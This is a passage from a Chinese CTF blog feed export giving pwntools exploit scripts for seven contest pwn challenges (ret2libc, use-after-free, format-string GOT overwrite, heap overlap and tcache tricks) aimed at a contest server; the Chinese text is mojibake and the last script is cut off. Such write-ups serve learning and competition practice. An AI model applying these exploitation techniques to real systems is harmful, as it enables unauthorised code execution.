FZl/jwYKU1Iduy3lAXXbUTRXuQ5UQdq1lCjZiW43p1ywdV6aDgqxOqKEWwvYzlYluWbNpo+Wc7agmgWmeIMjAqkljpI2a/mE9L+hEeM2WW0NAmB76iUzwVak+pkREogGOp49G1Ge3doRtD1EbULQB0FAmaC0VJ42uk7wLe/bVTR05W2zy6RIqE2QYFP/GYq2yKFSkwj406hXm3rSC7dwunuIGBXO0Avm3rERRhR9HOu1zNcIGhLBHkIKiVfNPzxmgK0Zm4790rCian6TOhyz/jtP6gltNTrS4LnTNod/QROIGUG+wjI4WYVns/wVClYjuqNMoADQhlqxCYSnCOA1x4mGfqypMyW/d7WTq3A/JgqKcOWwNa7m8XBYs9OLvblUqmeF2uKj3VBjStBtI9g/fzjur/KNgpj76INy7mpkn8b/VXKzbeXvCMNQlbE8OjNrORAVYNUPATjNcb9bX7SemCdx8AZLw0abDsEU/9lRu73DHeWRAYyX+lR35UwMAui//k8= </div>]]></content>
  </entry>
  <entry>
    <title>CUMTCTF2020å²æœ«èµ›</title>
    <url>/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="CUMTCTF2020å²æœ«èµ›"><a href="#CUMTCTF2020å²æœ«èµ›" class="headerlink" title="CUMTCTF2020å²æœ«èµ›"></a>CUMTCTF2020å²æœ«èµ›</h1><p>å­¦é•¿ä»¬å¯å¤ªæäº†ï¼Œæ¯”èµ›æœ€åå‚ç›´ä¸Šåˆ†å¯å¤ªç§€äº†</p>
<p><img src="/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/image-20201226220723157.png" alt="image-20201226220723157"></p>
<p>åªæ”¾PWNçš„é¢˜è§£äº†</p>
<p>ä¸‹é¢å‡ ä¸ªé¢˜å…ˆæ”¾é¢˜è§£ï¼Œç­‰æœŸæœ«è€ƒå®Œè¯•æ¥å¤ç°</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h2><p>\x00æˆªæ–­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn1"</span>)</span><br><span class="line">p = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"\x00"</span>*<span class="number">7</span> + p32(<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h2><p>åœ¨1çš„åŸºç¡€ä¸Šputsæ³„éœ²</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'219.219.61.234'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn2")</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context(arch="i386",os="linux")</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'\x00'</span>*<span class="number">7</span> + <span class="string">'\xff'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"you_really_know_random_haha"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">put_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x80486D3</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>) + p32(put_plt) + p32(main) + p32(put_got)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">print(r.recv())</span><br><span class="line">put = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">print(hex(put))</span><br><span class="line"><span class="comment">#libc = LibcSearcher('puts',put)</span></span><br><span class="line"></span><br><span class="line">libcbase = put - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">print(hex(binsh))</span><br><span class="line">sh = libcbase + binsh</span><br><span class="line">payload1 = <span class="string">b'\x00'</span>*<span class="number">7</span> + <span class="string">b'\xff'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"you_really_know_random_haha"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">payload3 = <span class="string">b"A"</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="PWN3"><a href="#PWN3" class="headerlink" title="PWN3"></a>PWN3</h2><p>UAF</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("219.219.61.234",10002)</span></span><br><span class="line">r = process(<span class="string">"./pwn3"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x8048986</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"AAAA"</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"BBBB"</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>,p32(magic))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="PWN4-fail"><a href="#PWN4-fail" class="headerlink" title="PWN4(fail)"></a>PWN4(fail)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn4'</span>)</span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10003'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn4'</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'a'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">key = <span class="string">'3xpL0r3R'</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(str(key))</span><br><span class="line">payload = <span class="string">'aaaa%77$p'</span><span class="comment">#6</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'aaaa0x'</span>)</span><br><span class="line">libc_base = int(int(sh.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x20840</span>)</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">puts_addr = libc_base + libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line">gad_get = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">one_addr = libc_base + gad_get[<span class="number">0</span>]</span><br><span class="line">log.success(hex(one_addr))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;puts_got:one_addr&#125;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="PWN5-fail"><a href="#PWN5-fail" class="headerlink" title="PWN5(fail)"></a>PWN5(fail)</h2><p>æ·¦ è¿™ä¸ªé¢˜æˆ‘ä»¥ä¸ºç»™çš„libcå°±èƒ½ç”¨ æ²¡æƒ³åˆ°ç”¨çš„æ˜¯æœ¬æœºçš„libcç®€ç›´è¡€äº</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10004</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn5")</span></span><br><span class="line">heap = ELF(<span class="string">'./pwn5'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"OK!"</span>)</span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">print(hex(system_addr))</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#print(hex(heap.got['free']))</span></span><br><span class="line"><span class="comment">#add(0x10,"/bin/sh\x00")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#delete(1)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="PWN6-fail"><a href="#PWN6-fail" class="headerlink" title="PWN6(fail)"></a>PWN6(fail)</h2><p>exp1:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./pwn6'</span>)</span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10005'</span>)</span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#idx </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> sh.recvuntil(<span class="string">'size&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(str(size))</span><br><span class="line"> sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> <span class="comment">#sh.recvuntil('dele success')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"3"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'5'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="comment">#leave message at bss</span></span><br><span class="line">sh.recvuntil(<span class="string">'secret\n'</span>)</span><br><span class="line">sh.sendline(<span class="string">'aaa'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="comment">#overwrite</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x130</span>, <span class="string">'aa'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>, <span class="string">'aa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">'aaaaaaa'</span>)<span class="comment">#edit this to ....</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'aaaaaaa\x0a'</span>)</span><br><span class="line"><span class="comment">#sh.recv(8)</span></span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4ca8</span></span><br><span class="line">free_addr = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">malloc_addr = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(hex(free_addr))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#h</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)</span><br><span class="line"><span class="comment">#x/30gx 0x602120 </span></span><br><span class="line"><span class="comment">#bss_ptr</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x88</span> * <span class="string">'a'</span> + <span class="string">'\xb1'</span>)<span class="comment">#</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">'aaa'</span>)<span class="comment">#</span></span><br><span class="line">payload1 = <span class="number">0x20</span> * <span class="string">'a'</span> + <span class="string">'\x98'</span> + <span class="number">7</span> * <span class="string">'\x00'</span> + p64(free_addr)</span><br><span class="line">edit(<span class="number">8</span>,payload1)</span><br><span class="line"><span class="comment">#one_addr = libc_base + 0x45226 #0x4527a,0xf0364,0xf1207</span></span><br><span class="line">one_addr = libc_base + <span class="number">0x4527a</span></span><br><span class="line">payload2 = p64(one_addr)</span><br><span class="line">edit(<span class="number">4</span>,payload2)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>exp2:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line"><span class="comment"># p = elf.process()</span></span><br><span class="line">p = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10005'</span>)</span><br><span class="line"><span class="comment"># libc = ELF('libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enter</span><span class="params">()</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">"important secret"</span>,<span class="string">"ld1ng"</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,con)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"> p.sendlineafter(<span class="string">'size&gt;&gt;'</span>,str(size))</span><br><span class="line"> p.sendlineafter(<span class="string">'name&gt;&gt;'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"> p.sendafter(<span class="string">'name&gt;&gt;'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'5'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line">enter()</span><br><span class="line">add(<span class="number">0</span>,<span class="number">128</span>,<span class="string">"aaa"</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">128</span>,<span class="string">"bbb"</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> -libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">info(hex(libc_base))</span><br><span class="line">sys = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">info(hex(sys))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">"ccc"</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">"ddd"</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x88</span>,<span class="string">"eee"</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x88</span> + <span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xc8</span>,<span class="string">"fff"</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">16</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x88</span>)+p64(<span class="number">0x602080</span>)+p64(<span class="number">0</span>))</span><br><span class="line">p.sendline(<span class="string">"ls"</span>)</span><br><span class="line"><span class="comment"># add(6,0x80,"ld1ng")</span></span><br><span class="line">edit(<span class="number">3</span>,p64(sys))</span><br><span class="line"><span class="comment">#p.sendline("ls")</span></span><br><span class="line"><span class="comment">#p.sendline("cat flag")</span></span><br><span class="line"><span class="comment"># delete(4)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="PWN7-fail"><a href="#PWN7-fail" class="headerlink" title="PWN7(fail)"></a>PWN7(fail)</h2><p>&gt;<br>&gt;<br>&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process("./pwn7")</span></span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10050'</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"1"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(size))</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"2"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"3"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="comment">#step1: æ„é€ å‡º0x200çš„pre_size</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):<span class="comment">#ç”¨åˆ°10ä¸ªå—</span></span><br><span class="line"> add(<span class="number">0x80</span>,<span class="string">'a'</span> * <span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):<span class="comment">#å…­ä¸ªè¿›å…¥tcahce</span></span><br><span class="line"> delete(i)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#é˜²æ­¢top_chunkåˆå¹¶</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">9</span>):</span><br><span class="line"> delete(i)<span class="comment">#pre_sizeåˆ†åˆ«ä¸º0x0,0x100,0x200 ï¼ˆè¿™é‡Œåˆå¹¶äº†ï¼‰</span></span><br><span class="line"><span class="comment">#åˆ°è¿™é‡Œå…¨éƒ¨éƒ½freeæ‰äº†ï¼Œ7ä¸ªåœ¨tcache,3ä¸ªåœ¨unsorted_bin</span></span><br><span class="line"><span class="comment">#step2: æŠŠ0x100æ”¾å…¥tcache å¹¶ç”±å—7è¿›å…¥unsorted_binæä¾›libc</span></span><br><span class="line"><span class="comment">#å¦å¤–æ³¨æ„ä¸€ä¸‹idx</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#å æ»¡tcache è¿™é‡Œæ˜¯å€’ç€çš„ 6,5,4,3,2,1ï¼Œx,x,x,0</span></span><br><span class="line"> add(<span class="number">0x8</span>,p64(i))</span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">7</span>)) <span class="comment">#åˆ‡åˆ†unsorted_bin</span></span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">9</span>)) <span class="comment">#10ä¸ªåˆ†é…å®Œæ¯•</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>): <span class="comment">#è¿™é‡Œidx=6æ²¡æœ‰é‡Šæ”¾ ä¹Ÿå°±æ˜¯æœ€ä¸Šé¢çš„</span></span><br><span class="line"> delete(i)</span><br><span class="line">delete(<span class="number">8</span>) <span class="comment">#è¿›å…¥tcache å¸¦ç€0x100</span></span><br><span class="line">delete(<span class="number">7</span>) <span class="comment">#è¿›å…¥unsorted_bin æä¾›Libc </span></span><br><span class="line">add(<span class="number">0xf8</span>, p64(<span class="number">0</span>)) <span class="comment">#è¿™æ¬¡åˆ†é…çš„æ˜¯idx=8çš„Bå—ï¼Œ å°†Cå—çš„inuseä½ç»™æ¸…äº†</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#å¡«æ»¡tcache</span></span><br><span class="line">delete(<span class="number">9</span>) <span class="comment">#ä¿ƒä½¿å—åˆå¹¶ï¼Œä½†å—8è¿˜åœ¨ä½¿ç”¨</span></span><br><span class="line"><span class="comment">#step3: leak libc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line"> add(<span class="number">0x8</span>, p64(i))</span><br><span class="line">add(<span class="number">0x8</span> ,p64(<span class="number">7</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">log.success((hex(libc_base)))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span 